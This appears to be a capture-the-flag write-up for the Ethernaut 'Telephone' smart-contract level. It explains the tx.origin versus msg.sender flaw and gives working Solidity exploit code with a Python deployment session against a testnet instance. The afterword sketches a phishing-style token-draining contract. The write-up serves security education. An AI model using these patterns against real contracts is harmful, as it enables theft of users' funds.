# 04 - Telephone

## Challenge

Claim ownership of the contract below to complete this level.

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

## Summary

The contract is vulnerable to `tx.origin` attack. The `changeOwner` function will change the owner if the caller is not the original caller of the transaction. This means that if we call `changeOwner` from another contract, the `tx.origin` will be the original caller of the transaction (our account), which is NOT the same as `msg.sender` (the middle contract), and the `owner` could be changed.

Here's a nice graph to summarize the difference between `tx.origin` and `msg.sender`:

![tx.origin vs msg.sender](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Q_mcX4Po8JTKUS2yJhvcPQ.png)

## Walkthrough

```py
>>> from cheb3 import Connection
>>> from cheb3.utils import compile_sol
>>> conn = Connection("https://goerli.infura.io/v3/<key>")
>>> account = conn.account("<priv_key>")
>>> contract_addr = '0x3df06561127880A168E7A2ae3AbE06d407420110'
```

As explained, we simply create a middle contract which can call `changeOwner`.

```py
>>> abi, bytecode = compile_sol('''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneExploit {
    address public owner;

    constructor() {
        owner = msg.sender; // set owner to our account
    }

    function attack(address _telephoneAddress) public {
        ITelephone(_telephoneAddress).changeOwner(owner);
    }
}
''',
solc_version="0.8.17",
base_path="Ethernaut/node_modules/"
)['TelephoneExploit']

>>> contract = conn.contract(account, abi=abi, bytecode=bytecode)
>>> contract.deploy()
2023-06-05 12:06:08.755 | DEBUG    | cheb3.contract:deploy:92 - Deploying contract ...
2023-06-05 12:06:21.555 | INFO     | cheb3.contract:deploy:97 - The contract is deployed at 0xec3a8E87A7064e1482d51f0A1c4A0c7Bb5F0f773
```

Now we just need to call `attack` `_telephoneAddress`, which is `contract_addr`.

```py
>>> contract.functions.attack(contract_addr).send_transaction(gas_limit=1000000) # gas_limit is required
2023-06-05 12:07:11.226 | INFO     | cheb3.contract:send_transaction:232 - (0xec3a8E87A7064e1482d51f0A1c4A0c7Bb5F0f773).attack transaction hash: 0x212b58e14b82a56cc57c4345adfc528cbda5d271ee3b62b22a83020b6cdcac0d
AttributeDict({'blockHash': HexBytes('0x410f149526baacd76e63478ab81929b18e1a386f674e2e3904a6adc581256941'), 'blockNumber': 9128266, 'contractAddress': None, 'cumulativeGasUsed': 7746770, 'effectiveGasPrice': 9000, 'from': '0x0b26C24d538e3dfF58F7c733535e65a6674FB3aB', 'gasUsed': 32368, 'logs': [], 'logsBloom': HexBytes('0x00..00'), 'status': 1, 'to': '0xec3a8E87A7064e1482d51f0A1c4A0c7Bb5F0f773', 'transactionHash': HexBytes('0x212b58e14b82a56cc57c4345adfc528cbda5d271ee3b62b22a83020b6cdcac0d'), 'transactionIndex': 41, 'type': 0})
```

`await contract.owner()` now will return our account address. Finally, submit the instance to pass the level.

## Afterword

While this example may be simple, confusing `tx.origin` with `msg.sender` can lead to phishing-style attacks, such as [this](https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/).

An example of a possible attack is outlined below.

1. Use `tx.origin` to determine whose tokens to transfer, e.g.

```js
function transfer(address _to, uint _value) {
    tokens[tx.origin] -= _value;
    tokens[_to] += _value;
}
```

2. Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.

```js
function () payable {
    token.transfer(attackerAddress, 10000);
}
```

3. In this scenario, `tx.origin` will be the victim's address (while `msg.sender` will be the malicious contract's address), resulting in the funds being transferred from the victim to the attacker.